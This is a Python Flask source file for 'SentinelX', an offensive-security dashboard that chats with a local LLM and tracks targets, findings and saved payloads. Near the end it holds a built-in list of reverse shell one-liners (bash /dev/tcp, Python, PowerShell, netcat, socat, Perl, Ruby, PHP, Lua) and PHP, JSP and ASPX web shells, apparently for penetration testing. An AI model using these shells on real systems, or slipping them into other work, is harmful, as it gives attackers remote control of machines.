"""SentinelX Web Dashboard."""
import json
import uuid
import os
import threading
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template, Response, stream_with_context
import requests

from sentinelx import database as db

# Get paths relative to this file
BASE_DIR = Path(__file__).parent
TEMPLATE_DIR = BASE_DIR / "templates"
STATIC_DIR = BASE_DIR / "static"

app = Flask(__name__, template_folder=str(TEMPLATE_DIR), static_folder=str(STATIC_DIR))

# Security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

OLLAMA_URL = "http://localhost:11434/api/chat"
DEFAULT_MODEL = "cypher-21/SentinalX"

# Track active streaming requests for cancellation
active_requests = {}
request_lock = threading.Lock()


# ============ Pages ============

@app.route('/')
def index():
    return render_template('dashboard.html')


# ============ Health Check ============

@app.route('/api/health')
def api_health():
    """Check Ollama server and model status."""
    try:
        r = requests.get("http://localhost:11434/api/tags", timeout=3)
        r.raise_for_status()
        models = [m['name'] for m in r.json().get('models', [])]
        has_sentinelx = any('sentinelx' in m for m in models)
        return jsonify({
            "success": True,
            "ollama": True,
            "model_ready": has_sentinelx,
            "models": models
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "ollama": False,
            "model_ready": False,
            "error": str(e)
        })


# ============ Sessions API ============

@app.route('/api/sessions')
def api_get_sessions():
    sessions = db.get_sessions()
    return jsonify({"success": True, "sessions": sessions})


@app.route('/api/sessions', methods=['POST'])
def api_create_session():
    data = request.json
    name = data.get('name')
    session_id = db.create_session(name)
    return jsonify({"success": True, "session_id": session_id})


@app.route('/api/sessions/<session_id>', methods=['PATCH'])
def api_rename_session(session_id):
    """Rename a session."""
    data = request.json
    name = data.get('name', '').strip()
    if not name:
        return jsonify({"error": "Name required"}), 400
    db.rename_session(session_id, name)
    return jsonify({"success": True})


@app.route('/api/sessions/<session_id>', methods=['DELETE'])
def api_delete_session(session_id):
    db.delete_session(session_id)
    return jsonify({"success": True})


@app.route('/api/sessions/<session_id>/messages')
def api_get_messages(session_id):
    messages = db.get_messages(session_id)
    return jsonify({"success": True, "messages": messages})


@app.route('/api/sessions/<session_id>/messages', methods=['DELETE'])
def api_clear_messages(session_id):
    """Clear all messages in a session."""
    db.clear_messages(session_id)
    return jsonify({"success": True})


@app.route('/api/sessions/<session_id>/export')
def api_export_session(session_id):
    """Export session as markdown."""
    messages = db.get_messages(session_id)
    
    # Build markdown
    md_lines = ["# SentinelX Chat Export\n"]
    md_lines.append(f"Session: {session_id}\n")
    md_lines.append(f"Exported: {datetime.utcnow().isoformat()}\n")
    md_lines.append("---\n")
    
    for m in messages:
        role = "**You:**" if m['role'] == 'user' else "**SentinelX:**"
        md_lines.append(f"\n{role}\n\n{m['content']}\n")
    
    content = "\n".join(md_lines)
    
    return Response(
        content,
        mimetype='text/markdown',
        headers={'Content-Disposition': f'attachment; filename=sentinelx-{session_id}.md'}
    )


# ============ Chat Streaming ============

@app.route('/api/chat/stream', methods=['POST'])
def api_chat_stream():
    data = request.json
    message = data.get('message', '')
    session_id = data.get('session_id')
    model = data.get('model', DEFAULT_MODEL)
    
    if not message or not session_id:
        return jsonify({"error": "Missing message or session_id"}), 400
    
    # Generate request ID for cancellation
    request_id = str(uuid.uuid4())[:8]
    
    # Save user message
    db.add_message(session_id, 'user', message)
    
    # Get history - all messages are sent to maintain context
    history = db.get_messages(session_id)
    
    # Build messages for Ollama (full conversation history for context)
    messages = []
    context = db.build_context(session_id)
    
    for i, m in enumerate(history):
        content = m['content']
        # Inject context into first user message
        if i == 0 and m['role'] == 'user' and context:
            content = context + content
        messages.append({"role": m['role'], "content": content})
    
    def generate():
        full_response = ""
        cancelled = False
        
        # Track this request
        with request_lock:
            active_requests[request_id] = {"cancelled": False}
        
        try:
            payload = {
                "model": model,
                "messages": messages,
                "stream": True
            }
            
            with requests.post(OLLAMA_URL, json=payload, stream=True, timeout=120) as r:
                r.raise_for_status()
                
                for line in r.iter_lines():
                    # Check for cancellation
                    with request_lock:
                        if request_id in active_requests and active_requests[request_id]["cancelled"]:
                            cancelled = True
                            break
                    
                    if line:
                        chunk = json.loads(line.decode('utf-8'))
                        if 'message' in chunk and 'content' in chunk['message']:
                            content = chunk['message']['content']
                            full_response += content
                            yield content
                        if chunk.get('done'):
                            break
        
        except Exception as e:
            error_msg = f"[Error: {e}]"
            full_response = error_msg
            yield error_msg
        
        finally:
            # Cleanup request tracking
            with request_lock:
                active_requests.pop(request_id, None)
            
            # Save response (even if partial due to cancellation)
            if full_response:
                db.add_message(session_id, 'assistant', full_response)
    
    response = Response(stream_with_context(generate()), mimetype='text/plain')
    response.headers['X-Request-ID'] = request_id
    return response


@app.route('/api/chat/abort', methods=['POST'])
def api_chat_abort():
    """Abort a streaming request."""
    data = request.json
    request_id = data.get('request_id')
    
    if not request_id:
        return jsonify({"error": "Missing request_id"}), 400
    
    with request_lock:
        if request_id in active_requests:
            active_requests[request_id]["cancelled"] = True
            return jsonify({"success": True, "message": "Request cancelled"})
    
    return jsonify({"success": False, "message": "Request not found"})


# ============ Targets API ============

@app.route('/api/targets')
def api_get_targets():
    targets = db.get_targets()
    return jsonify({"success": True, "targets": targets})


@app.route('/api/targets', methods=['POST'])
def api_add_target():
    data = request.json
    value = data.get('value', '').strip()
    notes = data.get('notes', '')
    
    if not value:
        return jsonify({"error": "Missing value"}), 400
    
    success = db.add_target(value, notes)
    return jsonify({"success": success})


@app.route('/api/targets/<int:target_id>', methods=['DELETE'])
def api_delete_target(target_id):
    db.delete_target(target_id)
    return jsonify({"success": True})


# ============ Findings API ============

@app.route('/api/findings')
def api_get_findings():
    session_id = request.args.get('session_id')
    findings = db.get_findings(session_id)
    return jsonify({"success": True, "findings": findings})


@app.route('/api/findings', methods=['POST'])
def api_add_finding():
    data = request.json
    session_id = data.get('session_id')
    title = data.get('title', '').strip()
    severity = data.get('severity', 'info')
    description = data.get('description', '')
    target = data.get('target', '')
    
    if not title:
        return jsonify({"error": "Title required"}), 400
    
    finding_id = db.add_finding(session_id, title, severity, description, target)
    return jsonify({"success": True, "finding_id": finding_id})


@app.route('/api/findings/<int:finding_id>', methods=['DELETE'])
def api_delete_finding(finding_id):
    db.delete_finding(finding_id)
    return jsonify({"success": True})


# ============ Payloads API ============

@app.route('/api/payloads')
def api_get_payloads():
    category = request.args.get('category')
    payloads = db.get_payloads(category)
    return jsonify({"success": True, "payloads": payloads})


@app.route('/api/payloads', methods=['POST'])
def api_save_payload():
    data = request.json
    name = data.get('name', 'Untitled')
    category = data.get('category', 'general')
    code = data.get('code', '')
    language = data.get('language', '')
    
    payload_id = db.save_payload(name, category, code, language)
    return jsonify({"success": True, "payload_id": payload_id})


@app.route('/api/payloads/<payload_id>', methods=['DELETE'])
def api_delete_payload(payload_id):
    db.delete_payload(payload_id)
    return jsonify({"success": True})


# ============ Models API ============

@app.route('/api/models')
def api_get_models():
    try:
        r = requests.get("http://localhost:11434/api/tags", timeout=5)
        r.raise_for_status()
        models = [m['name'] for m in r.json().get('models', [])]
        return jsonify({"success": True, "models": models})
    except Exception as e:
        return jsonify({"success": False, "models": ["sentinelx"], "error": str(e)})


# ============ Quick Payloads ============

QUICK_PAYLOADS = {
    "revshell_bash": {
        "name": "Bash Reverse Shell",
        "code": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
        "language": "bash",
        "category": "reverse"
    },
    "revshell_python": {
        "name": "Python Reverse Shell",
        "code": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
        "language": "python",
        "category": "reverse"
    },
    "revshell_powershell": {
        "name": "PowerShell Reverse Shell",
        "code": """$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
        "language": "powershell",
        "category": "reverse"
    },
    "revshell_nc": {
        "name": "Netcat Reverse Shell",
        "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
        "language": "bash",
        "category": "reverse"
    },
    "revshell_nc_e": {
        "name": "Netcat -e Reverse Shell",
        "code": "nc -e /bin/sh LHOST LPORT",
        "language": "bash",
        "category": "reverse"
    },
    "revshell_socat": {
        "name": "Socat Reverse Shell",
        "code": "socat TCP:LHOST:LPORT EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "language": "bash",
        "category": "reverse"
    },
    "revshell_perl": {
        "name": "Perl Reverse Shell",
        "code": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'""",
        "language": "perl",
        "category": "reverse"
    },
    "revshell_ruby": {
        "name": "Ruby Reverse Shell",
        "code": """ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
        "language": "ruby",
        "category": "reverse"
    },
    "revshell_php": {
        "name": "PHP Reverse Shell",
        "code": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "language": "php",
        "category": "reverse"
    },
    "revshell_lua": {
        "name": "Lua Reverse Shell",
        "code": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
        "language": "lua",
        "category": "reverse"
    },
    "webshell_php": {
        "name": "PHP Web Shell",
        "code": """<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>""",
        "language": "php",
        "category": "webshell"
    },
    "webshell_jsp": {
        "name": "JSP Web Shell",
        "code": """<%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd"); if(cmd!=null){Process p=Runtime.getRuntime().exec(cmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line);}} %>""",
        "language": "jsp",
        "category": "webshell"
    },
    "webshell_aspx": {
        "name": "ASPX Web Shell",
        "code": """<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%= Process.Start(new ProcessStartInfo("cmd","/c " + Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>""",
        "language": "aspx",
        "category": "webshell"
    }
}


@app.route('/api/quick-payloads')
def api_quick_payloads():
    return jsonify({"success": True, "payloads": QUICK_PAYLOADS})


# ============ Main ============

if __name__ == '__main__':
    print("=" * 60)
    print("  SENTINELX - Offensive Security Intelligence Platform")
    print("=" * 60)
    print()
    print("  Dashboard: http://127.0.0.1:5000")
    print()
    print("  Model setup:")
    print("  ollama create sentinelx -f ./models/Modelfile")
    print()
    print("=" * 60)
    
    # Use DEBUG env var, default to False for security
    debug_mode = os.environ.get('SENTINELX_DEBUG', '').lower() == 'true'
    app.run(host='127.0.0.1', port=5000, debug=debug_mode, threaded=True)
